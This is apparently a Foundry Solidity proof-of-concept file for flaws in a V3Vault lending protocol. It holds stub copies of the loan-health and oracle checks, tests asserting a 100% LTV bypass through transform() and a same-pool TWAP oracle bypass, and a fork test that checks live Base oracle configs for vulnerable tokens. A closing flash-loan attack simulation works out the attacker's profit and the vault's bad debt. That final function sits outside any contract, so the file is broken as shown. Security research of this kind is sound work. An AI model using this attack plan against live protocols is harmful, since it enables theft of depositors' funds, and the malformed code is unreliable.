// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console2.sol";

// ============================================================
// STUB 1 - byte-for-byte copy of the two functions in V3Vault
// that decide whether a loan is healthy.
// ============================================================
contract HealthStub {
    uint256 public constant Q32 = 2 ** 32;
    uint256 public constant BORROW_SAFETY_BUFFER_X32 = (Q32 * 95) / 100;

    /// @dev mirrors V3Vault._checkLoanIsHealthy(tokenId, debt, withBuffer)
    function isHealthy(uint256 collateralValue, uint256 debt, bool withBuffer)
        public
        pure
        returns (bool)
    {
        return (
            withBuffer
                ? (collateralValue * BORROW_SAFETY_BUFFER_X32) / Q32
                : collateralValue
        ) >= debt;
    }
}

// ============================================================
// STUB 2 - copy of V3Oracle._requireMaxDifference plus the
// derived-price equality check for twapSeconds == 0.
// ============================================================
contract OracleStub {
    /// @dev mirrors V3Oracle._requireMaxDifference
    function requireMaxDifference(uint256 priceX96, uint256 verifyPriceX96, uint16 maxDiffX10000)
        public
        pure
    {
        uint256 diff = priceX96 >= verifyPriceX96
            ? priceX96 - verifyPriceX96
            : verifyPriceX96 - priceX96;
        uint256 diffX10000 = verifyPriceX96 == 0
            ? type(uint256).max
            : (diff * 10000) / verifyPriceX96;

        require(
            verifyPriceX96 == 0 || diffX10000 <= maxDiffX10000,
            "PriceDifferenceExceeded"
        );
    }

    /// @dev When twapSeconds == 0 and the reference pool IS the
    /// position pool, derived price equals spot price, so the
    /// _requireMaxDifference check is a no-op.
    function derivedEqualsSpotWhenSamePool(uint32 twapSeconds, bool samePool)
        public
        pure
        returns (bool)
    {
        return twapSeconds == 0 && samePool;
    }
}

// ============================================================
// TESTS
// ============================================================
contract ProveV3Bugs is Test {
    HealthStub h;
    OracleStub o;

    function setUp() public {
        h = new HealthStub();
        o = new OracleStub();
    }

    // --------------------------------------------------------
    // FINDING 1 - 100% LTV Bypass
    // --------------------------------------------------------
    function test_F1_100pct_ltv_bypass() public {
        uint256 collateralValue = 1000e18;
        uint256 debtAt100 = 1000e18;

        // Core claim: two paths, two outcomes at 100% LTV
        bool normalOk    = h.isHealthy(collateralValue, debtAt100, true);
        bool transformOk = h.isHealthy(collateralValue, debtAt100, false);

        // Exact caps, computed - not assumed
        uint256 borrowCap    = (collateralValue * h.BORROW_SAFETY_BUFFER_X32()) / h.Q32();
        uint256 transformCap = collateralValue;

        console2.log("collateralValue     :", collateralValue);
        console2.log("debt at 100pct LTV  :", debtAt100);
        console2.log("borrow() healthy    :", normalOk);
        console2.log("transform() healthy :", transformOk);
        console2.log("borrow() cap        :", borrowCap);
        console2.log("transform() cap     :", transformCap);
        console2.log("buffer freed        :", transformCap - borrowCap);

        // The bug
        assertFalse(normalOk,    "borrow() MUST reject 100pct LTV");
        assertTrue (transformOk, "BUG CONFIRMED: transform() accepts 100pct LTV");

        // Exact boundaries of each path
        assertTrue (h.isHealthy(collateralValue, borrowCap,     true), "borrow() accepts its exact cap");
        assertFalse(h.isHealthy(collateralValue, borrowCap + 1, true), "borrow() rejects cap + 1 wei");
        assertTrue (h.isHealthy(collateralValue, transformCap,     false), "transform() accepts its exact cap");
        assertFalse(h.isHealthy(collateralValue, transformCap + 1, false), "transform() rejects cap + 1 wei");

        // Caps differ by roughly 5 pct
        assertLt(borrowCap, transformCap, "borrow cap strictly below transform cap");
        assertApproxEqRel(borrowCap, (transformCap * 95) / 100, 0.0001e18, "borrow cap near 95pct of transform cap");

        console2.log("[BUG] transform() lets debt reach 100pct of collateralValue");
        console2.log("[BUG] borrow()    stops at ~95pct");
        console2.log("[BUG] buffer bypassed:", transformCap - borrowCap, "wei of headroom freed");
    }

    // --------------------------------------------------------
    // FINDING 2 - Oracle Same-Pool Bypass
    // --------------------------------------------------------
    function test_F2_oracle_same_pool_bypass() public {
        uint256 spotManipulated = 500e18;
        uint16  maxDiff         = 0;

        // CASE A: twapSeconds > 0 -> derived is TWAP -> caught
        uint256 derivedFromTWAP = spotManipulated / 2;
        vm.expectRevert(bytes("PriceDifferenceExceeded"));
        o.requireMaxDifference(spotManipulated, derivedFromTWAP, maxDiff);
        console2.log("OK   : twapSeconds>0 rejects manipulated spot");

        // CASE B: twapSeconds == 0 + same pool -> derived == spot -> passes
        bool samePoolBypass = o.derivedEqualsSpotWhenSamePool(0, true);
        assertTrue(samePoolBypass, "precondition: same-pool + twap=0");

        o.requireMaxDifference(spotManipulated, spotManipulated, maxDiff);
        console2.log("BUG  : same-pool + twap=0 accepts 100x manipulated spot");

        // CASE C: twapSeconds == 0 but different pool -> caught
        bool samePoolBypassC = o.derivedEqualsSpotWhenSamePool(0, false);
        assertFalse(samePoolBypassC, "different pool is caught");
    }

    // --------------------------------------------------------
    // FINDING 3 - Combined Attack Profit
    // --------------------------------------------------------
    function test_F3_combined_attack_profit() public {
        uint256 fairCollateral   = 1000e18;
        uint256 manipulatedValue = 2000e18;
        uint256 collateralFactor = 90;

        uint256 borrowed = (manipulatedValue * collateralFactor) / 100;
        uint256 profit   = borrowed > fairCollateral ? borrowed - fairCollateral : 0;
        uint256 badDebt  = borrowed > fairCollateral ? borrowed - fairCollateral : 0;

        console2.log("fair collateral  :", fairCollateral);
        console2.log("manipulated value:", manipulatedValue);
        console2.log("attacker borrows :", borrowed);
        console2.log("attacker profit  :", profit);
        console2.log("vault bad debt   :", badDebt);

        assertGt(profit,  0,       "BUG CONFIRMED: attacker profits");
        assertEq(profit,  800e18,  "exact profit = 1800 - 1000");
        assertEq(badDebt, 800e18,  "vault left with 800 bad debt");
    }
}

// ============================================================
// OPTIONAL - verify deployed config on Base via fork.
// Runs only when BASE_FORK_URL and ORACLE_ADDRESS are set.
// ============================================================
interface IV3OracleReader {
    function feedConfigs(address) external view returns (
        address feed,
        uint32  maxFeedAge,
        uint8   feedDecimals,
        uint8   tokenDecimals,
        uint32  twapSeconds,
        address pool,
        bool    isToken0,
        uint8   mode,
        uint16  maxDifference
    );
    function maxPoolPriceDifference() external view returns (uint16);
}

contract ForkVerify is Test {
    function test_fork_verify_config() public {
        string memory rpc = vm.envOr("BASE_FORK_URL", string(""));
        if (bytes(rpc).length == 0) {
            console2.log("SKIP: BASE_FORK_URL not set");
            vm.skip(true);
            return;
        }

        address oracleAddr = address(uint160(vm.envOr("ORACLE_ADDRESS", uint256(0))));
        if (oracleAddr == address(0)) {
            console2.log("SKIP: ORACLE_ADDRESS not set");
            vm.skip(true);
            return;
        }

        vm.createSelectFork(rpc);
        IV3OracleReader oracle = IV3OracleReader(oracleAddr);

        uint16 maxDiff = oracle.maxPoolPriceDifference();
        console2.log("maxPoolPriceDifference:", maxDiff);

        address token = address(uint160(vm.envOr("TOKEN_ADDRESS", uint256(0))));
        if (token == address(0)) {
            console2.log("SKIP: TOKEN_ADDRESS not set");
            return;
        }

        (
            ,,
            ,
            ,
            uint32 twapSeconds,
            address pool,
            bool isToken0,
            uint8 mode,
            uint16 maxDiffToken
        ) = oracle.feedConfigs(token);

        console2.log("token          :", token);
        console2.log("twapSeconds    :", twapSeconds);
        console2.log("reference pool :", pool);
        console2.log("isToken0       :", isToken0);
        console2.log("mode (4=TWAP)  :", mode);
        console2.log("maxDifference  :", maxDiffToken);

        if (mode == 4 && twapSeconds == 0) {
            console2.log("BUG 2 CONFIRMED LIVE: TWAP mode + twapSeconds==0");
        } else {
            console2.log("this token is NOT vulnerable");
        }
    }
}
    // --------------------------------------------------------
    // FINDING 4 - END-TO-END ATTACK SIMULATION (profit check)
    // --------------------------------------------------------
    function test_simulate_attack_profitability() public {
        // === CONFIG ===
        uint256 lpFairValue      = 1_000e18;   // LP position at true price
        uint256 flashLoanSize    = 5_000e18;   // to swing the pool
        uint256 flashLoanFeeBps  = 9;          // 0.09% (Aave V3 / Balancer)
        uint256 gasBudget        = 50e18;      // rough $50 for all txs

        // === ATTACKER'S ROUND TRIP ===
        //
        // 1. Holds LP (fair $1000)
        // 2. Flash-borrows -> pool swings 2x -> oracle reads inflated value
        // 3. Borrows via transform() at 100% LTV of 90% CF (Finding 1 + 2)
        // 4. Unwinds flash loan -> pool back to fair
        // 5. Self-liquidates: pays liquidatorCost, gets LP back
        // 6. Position: LP($1000) + leftover cash, debt wiped
        //

        // Step 2 cost
        uint256 flashFee = (flashLoanSize * flashLoanFeeBps) / 10_000;

        // Step 3: borrowed = 90% CF * 2x manipulated LP
        uint256 manipulatedValue = lpFairValue * 2;
        uint256 borrowed = (manipulatedValue * 90) / 100; // = 1800

        // Step 4: unwind. Real position: debt=$1800, fair LP=$1000
        // _calculateLiquidation(debt=1800, fullValue=1000, collValue=900):
        //   fullValue(1000) < maxPenaltyValue(1800*1.10=1980) -> else branch
        //   penalty        = 10% * debt = 180
        //   liquidatorCost = fullValue - penalty = 820
        //   vaultWriteoff  = debt - liquidatorCost = 980
        uint256 penalty        = (borrowed * 10) / 100;
        uint256 liquidatorCost = lpFairValue - penalty;
        uint256 vaultWriteoff  = borrowed - liquidatorCost;

        // Step 5-6: cash + recovered LP
        uint256 attackerCash = borrowed - flashFee - liquidatorCost - gasBudget;
        uint256 attackerLP   = lpFairValue; // returned via liquidation

        uint256 attackerFinal  = attackerCash + attackerLP;
        uint256 attackerStart  = lpFairValue;
        int256  pnl            = int256(attackerFinal) - int256(attackerStart);

        // === REPORT ===
        console2.log("=== ATTACK SIMULATION ===");
        console2.log("LP fair value            :", lpFairValue);
        console2.log("Manipulated LP value     :", manipulatedValue);
        console2.log("Borrowed (transform 100%):", borrowed);
        console2.log("Flash loan fee           :", flashFee);
        console2.log("Liquidation cost paid    :", liquidatorCost);
        console2.log("Gas                      :", gasBudget);
        console2.log("---");
        console2.log("Attacker final cash      :", attackerCash);
        console2.log("Attacker final LP        :", attackerLP);
        console2.log("Attacker final total     :", attackerFinal);
        console2.log("Attacker start assets    :", attackerStart);
        console2.log("---");
        console2.log("ATTACKER PnL             :", uint256(pnl));
        console2.log("VAULT BAD DEBT           :", vaultWriteoff);
        console2.log("PROFITABLE               :", pnl > 0);

        assertGt(pnl, 0, "attack must be profitable");
        assertGt(vaultWriteoff, 0, "vault must take loss");
    }
